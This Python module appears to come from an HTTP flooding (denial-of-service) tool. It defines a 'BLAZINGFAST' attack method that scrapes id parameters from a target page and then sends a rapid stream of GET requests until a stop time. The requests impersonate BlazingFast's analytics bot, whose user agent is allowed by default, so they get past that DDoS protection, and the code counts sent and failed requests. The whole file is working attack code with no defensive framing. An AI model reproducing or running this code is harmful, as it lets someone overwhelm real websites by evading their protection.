'''

Copyright (c) 2022 Nexus/Nexuzzzz

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

'''

import time, requests, re
from src.core import Core
from src.utils import *
from src.useragent import *

def flood(attack_id, url, stoptime) -> None:

    ids = []
    if not Core.blazingfast_ids_grabbed:
        try:
            ids = [_id for _id in re.findall(r'([\.\\][a-z]+&?id=[1-4])',requests.get(url, headers=utils().buildheaders(url)).text)]
            Core.blazingfast_ids_grabbed = True
        except Exception:
            pass

    if ids == []: ids = ['1','2','3','4']

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        headers = utils().buildheaders(url)
        headers['User-Agent'] = 'BOT:/BlazingFastAnalytics'
        
        try:
            _id = choice(ids)
            req = Core.session.get(
                f'{url}?id_client={_id}', 
                headers=headers,
                json={"captcha": True, "auth": _id},
                verify=False, 
                timeout=(5,0.1), 
                allow_redirects=False,
                stream=False,
                cert=None,
            )

            if req.status_code == 204:
                Core.infodict[attack_id]['req_sent'] += 1

        except requests.exceptions.ReadTimeout:
            Core.infodict[attack_id]['req_sent'] += 1

        except Exception:
            Core.infodict[attack_id]['req_fail'] += 1

        Core.infodict[attack_id]['req_total'] += 1
    Core.threadcount -= 1

Core.methods.update({
    'BLAZINGFAST': {
        'info': 'Blazingfast bypass, impersonates the analytics bot which is allowed by default. Credits to 0x44F and mSQL',
        'func': flood
    }
})